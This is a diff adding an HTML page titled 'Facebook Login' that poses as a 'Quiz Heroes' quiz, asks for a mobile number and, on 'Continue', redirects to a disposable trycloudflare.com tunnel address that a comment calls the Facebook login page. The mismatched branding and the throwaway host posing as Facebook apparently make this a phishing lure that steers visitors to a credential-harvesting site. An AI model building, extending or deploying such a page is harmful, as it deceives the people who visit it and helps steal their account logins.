@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body {
+      background-image: url('https://c4.wallpaperflare.com/wallpaper/935/849/231/background-tree-book-wallpaper-preview.jpg'); /* Example AI-related image from Unsplash */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100vh;
+    }
+
+    .header {
+      text-align: center;
+      padding: 20px 0;
+      background-color: rgba(255, 255, 255, 0.8);
+      border-radius: 0 0 10px 10px;
+      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px 0;
+      background-color: rgba(255, 255, 255, 0.8);
+      border-radius: 10px 10px 0 0;
+      box-shadow: 0 -5px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .short-input {
+      background-color: rgba(255, 255, 255, 0.8);
+      border-radius: 10px;
+      padding: 20px;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .quiz-heading {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #007bff;
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      font-weight: bold;
+    }
+
+    .form-control {
+      border-radius: 5px;
+    }
+
+    .btn-primary {
+      background-color: #007bff;
+      border-color: #007bff;
+      font-weight: bold;
+    }
+
+    .btn-primary:hover {
+      background-color: #0056b3;
+      border-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="header">
+      <h1 class="text-center mb-4 quiz-heading">Welcome to the Quiz Heroes</h1>
+    </div>
+    <div class="col-md-6 mx-auto short-input">
+      <form id="phoneNumberForm" class="text-center">
+        <div class="form-group">
+          <label for="phoneNumber" class="form-label">Enter Your Mobile Number:</label>
+          <input type="tel" id="phoneNumber" class="form-control" required>
+        </div>
+        <button id="continueBtn" class="btn btn-primary mt-3">Continue</button>
+
+      </form>
+    </div>
+    <div class="footer">
+      <p>© 2023 Quiz Heroes. All rights reserved.</p>
+    </div>
+  </div>
+  <script>
+    // Add this script at the end of the <body> tag or wrap it in a DOMContentLoaded event handler.
+document.addEventListener("DOMContentLoaded", function() {
+  const continueButton = document.getElementById("continueBtn");
+
+  continueButton.addEventListener("click", function(event) {
+    event.preventDefault(); // Prevents the default form submission behavior
+
+    const phoneNumberInput = document.getElementById("phoneNumber");
+    const phoneNumber = phoneNumberInput.value;
+
+    // Validate the phone number if needed
+    // ...
+
+    // Redirect to the Facebook login page
+    window.location.href = "https://diff-whose-chronicle-bb.trycloudflare.com"; // Replace with the actual URL of the Facebook login page
+  });
+});
+
+  </script>
+</body>
+</html>
